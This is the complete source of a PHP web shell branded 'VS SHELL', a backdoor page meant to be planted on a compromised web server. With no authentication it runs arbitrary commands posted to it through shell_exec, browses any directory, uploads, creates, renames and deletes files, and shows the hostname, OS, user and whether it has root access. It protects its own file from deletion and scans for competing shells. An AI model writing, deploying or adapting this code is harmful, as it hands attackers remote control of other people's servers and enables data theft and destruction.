<?php
error_reporting(0);
session_start();
set_time_limit(0);

$path = $_GET['path'] ?? getcwd();
chdir($path);
$path = getcwd();

$notify = '';
$log = '';
$protectedFiles = [basename(__FILE__), '.htaccess'];

function perms($file) {
    return substr(sprintf('%o', fileperms($file)), -4);
}
function human($bytes) {
    $units = ['B','KB','MB','GB','TB'];
    for ($i = 0; $bytes >= 1024 && $i < count($units)-1; $i++) {
        $bytes /= 1024;
    }
    return round($bytes, 2).' '.$units[$i];
}
function getSysInfo() {
    $hostname = gethostname();
    $os = php_uname();
    $user = function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : 'unknown';
    $phpv = phpversion();
    $sapi = php_sapi_name();
    $disabled = ini_get('disable_functions');
    $root = ($user === 'root') ? "✅ ROOT ACCESS" : "⚠️ User: $user";

    return <<<HTML
    <pre style="background:#111;padding:15px;border:1px solid #00ff99;font-size:15px;line-height:1.3;word-break:break-word;white-space:pre-wrap;">
📛 Hostname : $hostname
🖥 OS       : $os
🔐 User     : $root
🐘 PHP      : $phpv ($sapi)
⛔ Disabled : $disabled
    </pre>
HTML;
}

if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $log = shell_exec($cmd . " 2>&1");
    $notify = "Command executed.";
}
if (isset($_POST['uploadfile']) && isset($_FILES['upfile']) && $_FILES['upfile']['error'] === UPLOAD_ERR_OK) {
    $fname = basename($_FILES['upfile']['name']);
    $target = "$path/$fname";
    if (!in_array($fname, $protectedFiles)) {
        move_uploaded_file($_FILES['upfile']['tmp_name'], $target);
        chmod($target, 0444);
        $notify = "File '$fname' uploaded successfully.";
    }
}
if (isset($_POST['addfile']) && !empty($_POST['filename'])) {
    $filename = basename($_POST['filename']);
    if (!in_array($filename, $protectedFiles)) {
        file_put_contents("$path/$filename", $_POST['newfile']);
        chmod("$path/$filename", 0444);
        $notify = "File '$filename' created.";
    }
}
if (isset($_POST['scan_shells'])) {
    $suspicious = [];
    foreach (scandir($path) as $file) {
        if (!is_file("$path/$file") || in_array($file, $protectedFiles)) continue;
        $content = file_get_contents("$path/$file");
        if (preg_match('/(shell_exec|eval|base64_decode|system|exec|passthru|popen|proc_open)/i', $content)) {
            $suspicious[] = $file;
        }
    }
    $notify = empty($suspicious) ? "No suspicious files found." : "Suspicious files: ".implode(", ", $suspicious);
}
if (isset($_POST['rename_from'], $_POST['rename_to'])) {
    $from = basename($_POST['rename_from']);
    $to = basename($_POST['rename_to']);
    if (!in_array($from, $protectedFiles)) {
        rename("$path/$from", "$path/$to");
        $notify = "File renamed to '$to'.";
    }
}
if (isset($_GET['delete'])) {
    $target = basename($_GET['delete']);
    if (!in_array($target, $protectedFiles)) {
        unlink("$path/$target");
        $notify = "File '$target' deleted.";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>VS SHELL</title>
<style>
    body {
        margin: 0;
        padding: 0;
        background: #0e1117;
        color: #e4e6eb;
        font-family: monospace;
    }
    header {
        background: #1f232a;
        padding: 20px;
        border-bottom: 1px solid #444;
    }
    header h1 {
        margin: 0;
        color: #58a6ff;
        font-size: 24px;
    }
    .section {
        padding: 20px;
        border-bottom: 1px solid #222;
    }
    .box {
        background: #161b22;
        border: 1px solid #444;
        padding: 15px;
        margin-bottom: 15px;
    }
    .table {
        width: 100%;
        border-collapse: collapse;
    }
    .table th, .table td {
        padding: 10px;
        border: 1px solid #2c313c;
        text-align: left;
    }
    .table th {
        background: #21262d;
        color: #58a6ff;
    }
    .action-group {
        display: flex;
        flex-wrap: wrap;
        gap: 6px;
        align-items: center;
    }
    .action-btn, .rename-input {
        padding: 5px 8px;
        font-size: 13px;
        border-radius: 4px;
        border: 1px solid #444;
    }
    .action-btn {
        background: #2c313c;
        color: #e4e6eb;
        cursor: pointer;
        text-decoration: none;
    }
    .action-btn:hover {
        background: #58a6ff;
        color: #fff;
    }
    .rename-input {
        background: #0e1117;
        color: #e4e6eb;
    }
    .notify {
        background: #14161a;
        border: 1px solid #00ff99;
        color: #7cf87c;
        padding: 10px;
        margin: 20px 0;
    }
    .actions-bar {
        display: flex;
        gap: 10px;
        flex-wrap: wrap;
        margin-bottom: 20px;
    }
    .actions-bar form {
        display: flex;
        gap: 6px;
        align-items: center;
    }
    .terminal-output {
        background: #000;
        color: #0f0;
        padding: 10px;
        margin-top: 10px;
        white-space: pre-wrap;
    }
</style>
</head>
<body>
<header>
    <h1>🛠️ VS Shell </h1>
</header>
<div class="section">
    <div class="box">
        <h3>🖥 Server Info</h3>
        <?php echo getSysInfo(); ?>
    </div>

    <?php if (!empty($notify)): ?>
    <div class="notify">
        ✅ <?= htmlspecialchars($notify) ?>
    </div>
    <?php endif; ?>

    <div class="box">
        <h3>⚙️ Tools</h3>
        <div class="actions-bar">
            <form method="POST">
                <input type="text" name="cmd" placeholder="Command" class="rename-input">
                <button type="submit" class="action-btn">💻 Terminal</button>
            </form>
            <form method="POST" enctype="multipart/form-data">
                <input type="file" name="upfile" class="action-btn">
                <button type="submit" name="uploadfile" class="action-btn">⬆️ Upload</button>
            </form>
            <form method="POST">
                <input type="text" name="filename" placeholder="New file name" class="rename-input">
                <input type="text" name="newfile" placeholder="File content" class="rename-input">
                <button type="submit" name="addfile" class="action-btn">📄 New File</button>
            </form>
            <form method="POST">
                <button type="submit" name="scan_shells" class="action-btn">🧪 Scan Shells</button>
            </form>
        </div>
        <?php if (!empty($log)): ?>
        <div class="terminal-output"><?= htmlspecialchars($log) ?></div>
        <?php endif; ?>
    </div>

    <div class="box">
        <h3>📁 File List</h3>
        <table class="table">
            <tr><th>Name</th><th>Size</th><th>Perms</th><th>Actions</th></tr>
            <?php
            $entries = scandir($path);
            natcasesort($entries);
            $folders = $files = [];
            foreach ($entries as $f) {
                if ($f === '.') continue;
                $fp = "$path/$f";
                if (is_dir($fp) && $f !== '..') {
                    $folders[] = $f;
                } elseif (is_file($fp)) {
                    $files[] = $f;
                }
            }
            if ($path !== '/') {
                $parent = dirname($path);
                echo "<tr><td colspan='4'><a href='?path=" . urlencode($parent) . "' class='action-btn'>⬅️ Back</a></td></tr>";
            }
            foreach (array_merge($folders, $files) as $f) {
                $fp = "$path/$f";
                $isDir = is_dir($fp);
                echo $isDir ? "<tr ondblclick=\"window.location='?path=" . urlencode($fp) . "'\">" : "<tr>";
                echo "<td>" . ($isDir ? "<strong style='color:#58a6ff;'>$f</strong>" : $f) . "</td>";
                echo "<td>" . ($isDir ? '-' : human(filesize($fp))) . "</td>";
                echo "<td>" . perms($fp) . "</td>";
                echo "<td><div class='action-group'>";
                if (!in_array($f, $protectedFiles)) {
                    if (!$isDir) echo "<a href='?edit=".urlencode($f)."' class='action-btn'>✏️ Edit</a>";
                    echo "<a href='?delete=".urlencode($f)."' onclick='return confirm(\"Delete $f?\")' class='action-btn'>🗑 Delete</a>";
                    echo "<form method='POST' style='display:inline;'>
                            <input type='hidden' name='rename_from' value='$f'>
                            <input type='text' name='rename_to' class='rename-input' placeholder='New name'>
                            <button type='submit' class='action-btn'>Rename</button>
                        </form>";
                } else {
                    echo "🔒 Protected";
                }
                echo "</div></td></tr>";
            }
            ?>
        </table>
    </div>
    </div>
</div>
</body>
</html>
